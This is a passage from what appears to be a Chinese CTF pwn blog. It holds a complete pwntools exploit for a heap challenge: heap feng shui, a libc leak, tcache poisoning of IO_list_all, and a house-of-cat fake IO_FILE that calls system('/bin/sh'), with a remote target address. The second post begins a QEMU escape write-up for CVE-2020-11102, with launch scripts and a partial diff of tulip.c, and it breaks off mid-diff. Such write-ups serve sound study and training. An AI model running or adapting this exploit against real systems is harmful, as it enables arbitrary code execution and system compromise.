class="number">0x428</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x408</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x4f8</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x408</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x408</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x408</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x408</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">0x400</span>+p64(<span class="number">0xc60</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&quot;c&quot;</span>*<span class="number">8</span>) </span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&quot;c&quot;</span>*<span class="number">8</span>) </span><br><span class="line">add(<span class="number">0x408</span>,<span class="string">&quot;c&quot;</span>*<span class="number">8</span>) </span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&quot;c&quot;</span>*<span class="number">8</span>) </span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ff0f0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<p>接下来就可以劫持 tcache，进而劫持 <code>IO_list_all</code></p>
<p>最后打 house of cat 就可以了（这里需要整理一下堆风水，以便 <code>/bin/sh</code> 的写入）</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./babyheap1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;&quot;)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1729)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;size&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;name&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,data</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;index&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;size&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;name&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;index&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;index&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">ru(<span class="string">&quot;easier\n&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x2a0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">fake_heap_addr = heap_base + <span class="number">0x2c0</span> </span><br><span class="line">payload = p64(<span class="number">0</span>)+ p64(<span class="number">0xc61</span>)</span><br><span class="line">payload += p64(fake_heap_addr+<span class="number">0x18</span>)+p64(fake_heap_addr+<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(fake_heap_addr)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x428</span>,payload)  <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x408</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x4f8</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x408</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x408</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x408</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x408</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">0x400</span>+p64(<span class="number">0xc60</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&quot;c&quot;</span>*<span class="number">8</span>) </span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&quot;c&quot;</span>*<span class="number">8</span>) </span><br><span class="line">add(<span class="number">0x408</span>,<span class="string">&quot;c&quot;</span>*<span class="number">8</span>) </span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&quot;c&quot;</span>*<span class="number">8</span>) </span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ff0f0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io_list_all = libc_base + <span class="number">0x1ff6a0</span></span><br><span class="line">key = (heap_base + <span class="number">0xb20</span>)&gt;&gt;<span class="number">12</span></span><br><span class="line">success(<span class="string">&quot;io_list_all &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(io_list_all))</span><br><span class="line">success(<span class="string">&quot;key &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line">libc_system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;_IO_wfile_jumps &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_wfile_jumps))</span><br><span class="line">success(<span class="string">&quot;libc_system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_system))</span><br><span class="line"></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_io_addr = heap_base + <span class="number">0x2d0</span> - <span class="number">0x10</span></span><br><span class="line">payload_addr = heap_base </span><br><span class="line">flag_addr = heap_base</span><br><span class="line"></span><br><span class="line">fake_IO_FILE =  <span class="string">b&quot;/bin/sh\x00&quot;</span>         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(payload_addr-<span class="number">0xa0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(libc_system)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(flag_addr)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps+<span class="number">0x30</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x8</span>,p64(io_list_all ^ key))</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&quot;d&quot;</span>*<span class="number">8</span>) </span><br><span class="line">add(<span class="number">0x400</span>,p64(fake_io_addr)) </span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(fake_IO_FILE),fake_IO_FILE)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/07/qemu%20escape+CVE-2020-11102/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/07/qemu%20escape+CVE-2020-11102/" class="post-title-link" itemprop="url">qemu escape+CVE-2020-11102</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-11-07 00:56:17" itemprop="dateCreated datePublished" datetime="2023-11-07T00:56:17+08:00">2023-11-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-12-01 01:52:56" itemprop="dateModified" datetime="2023-12-01T01:52:56+08:00">2023-12-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>32k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>29 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>EscapefromtheEarth 复现</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">./qemu-system-x86_64 -L ./dependency -kernel ./vmlinuz-4.15.0-208-generic -initrd ./rootfs.cpio -cpu kvm64,+smep \</span><br><span class="line">	-m 64M \</span><br><span class="line">	-monitor none \</span><br><span class="line">	-device tulip \</span><br><span class="line">	-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">	-nographic </span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">insmod /tulip.ko</span><br><span class="line">exec /bin/sh</span><br></pre></td></tr></table></figure>
<p>启动内核发现是 root 权限：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># whoami</span></span><br><span class="line">root</span><br><span class="line">/ <span class="meta"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>本题目提供了 <code>qemu-system-x86_64</code>，那极有可能是 qemu 逃逸</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>qemu 逃逸一般在如下4个函数中出现 BUG：</p>
<ul>
<li>pmio_read：读设备寄存器的物理地址（使用 <code>in()</code> 触发）</li>
<li>pmio_write：写设备寄存器的物理地址（使用 <code>out()</code> 触发）</li>
<li>mmio_read：读设备寄存器的虚拟地址（使用 mmap 映射物理内存，读这片区域时触发） </li>
<li>mmio_write：写设备寄存器的虚拟地址（使用 mmap 映射物理内存，写这片区域时触发）</li>
</ul>
<p>但本题目并没有注册 mmio / pmio 的相关函数，题目提供的线索指向 CVE-2020-11102，并提供的 qemu 的编译过程：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.qemu.org/qemu-4.2.0.tar.xz</span><br><span class="line">xz -d ./qemu-4.2.0.tar.xz</span><br><span class="line">tar -xvf ./qemu-4.2.0.tar</span><br><span class="line">cp ./tulip.c ./qemu-4.2.0/hw/net/</span><br><span class="line"><span class="meta">#</span><span class="bash">Then build qemu as normal</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<ul>
<li>QEMU 4.2.0 版本中的 <code>hw/net/tulip.c</code> 文件存在缓冲区错误漏洞</li>
<li>攻击者可利用该漏洞造成 QEMU 进程崩溃或可能以 QEMU 进程权限执行任意代码</li>
</ul>
<p>于是我们去下载 QEMU 4.2.1 的源码，用 diff 判断一下程序修改了哪里：</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- tulip.c	2023-03-29 14:50:12.000000000 +0800</span></span><br><span class="line"><span class="comment">+++ tulip2.c	2020-06-26 02:12:17.000000000 +0800</span></span><br><span class="line"><span class="meta">@@ -38,9 +38,9 @@</span></span><br><span class="line"> </span><br><span class="line">     uint8_t rx_frame[2048];</span><br><span class="line">     uint8_t tx_frame[2048];</span><br><span class="line"><span class="deletion">-    int tx_frame_len;</span></span><br><span class="line"><span class="deletion">-    int rx_frame_len;</span></span><br><span class="line"><span class="deletion">-    int rx_frame_size;</span></span><br><span class="line"><span class="addition">+    uint16_t tx_frame_len;</span></span><br><span class="line"><span class="addition">+    uint16_t rx_frame_len;</span></span><br><span class="line"><span class="addition">+    uint16_t rx_frame_size;</span></span><br><span class="line"> </span><br><span class="line">     uint32_t rx_status;</span><br><span class="line">     uint8_t filter[16][6];</span><br><span class="line"><span class="meta">@@ -58,9 +58,9 @@</span></span><br><span class="line">         VMSTATE_UINT64(current_tx_desc, TULIPState),</span><br><span class="line">         VMSTATE_BUFFER(rx_frame, TULIPState),</span><br><span class="line">         VMSTATE_BUFFER(tx_frame, TULIPState),</span><br><span class="line"><span class="deletion">-        VMSTATE_INT32(rx_frame_len, TULIPState),</span></span><br><span class="line"><span class="deletion">-        VMSTATE_INT32(tx_frame_len, TULIPState),</span></span><br><span class="line"><span class="deletion">-        VMSTATE_INT32(rx_frame_size, TULIPState),</span></span><br><span class="line"><span class="addition">+        VMSTATE_UINT16(rx_frame_len, TULIPState),</span></span><br><span class="line"><span class="addition">+        VMSTATE_UINT16(tx_frame_len, TULIPState),</span></span><br><span class="line"><span class="addition">+        VMSTATE_UINT16(rx_frame_size, TULIPState),</span></span><br><span class="line">         VMSTATE_UINT32(rx_status, TULIPState),</span><br><span class="line">         VMSTATE_UINT8_2DARRAY(filter, TULIPState, 16, 6),</span><br><span class="line">         VMSTATE_END_OF_LIST()</span><br><span class="line"><span class="meta">@@ -170,6 +170,7 @@</span></span><br><span class="line">         &#125; else &#123;</span><br><span class="line">             len = s-&gt;rx_frame_len;</span><br><span class="line">         &#125;</span><br><span class="line"><span class="addition">+</span></span><br><span class="line">         pci_dma_write(&amp;s-&gt;dev, desc-&gt;buf_addr1, s-&gt;rx_frame +</span><br><span class="line">             (s-&gt;rx_frame_size - s-&gt;rx_frame_len), len);</span><br><span class="line">         s-&gt;rx_frame_len -= len;</span><br><span class="line"><span class="meta">@@ -181,6 +182,7 @@</span></span><br><span class="line">         &#125; else &#123;</span><br><span class="line">             len = s-&gt;rx_frame_len;</span><br><span class="line">         &#125;</span><br><span class="line"><span class="addition">+</span></span><br><span class="line">         pci_dma_write(&amp;s-&gt;dev, desc-&gt;buf_addr2, s-&gt;rx_frame +</span><br><span class="line">             (s-&gt;rx_frame_size - s-&gt;rx_frame_len), len);</span><br><span class="line">         s-&gt;rx_frame_len -= len;</span><br><span class="line"><span class="meta">@@ -227,7 +229,8 @@</span></span><br><span class="line"> </span><br><span class="line">     trace_tulip_receive(buf, size);</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-    if (size &lt; 14 || size &gt; 2048 || tulip_rx_stopped(s)) &#123;</span></span><br><span class="line"><span class="addition">+    if (size &lt; 14 || size &gt; sizeof(s-&gt;rx_frame) - 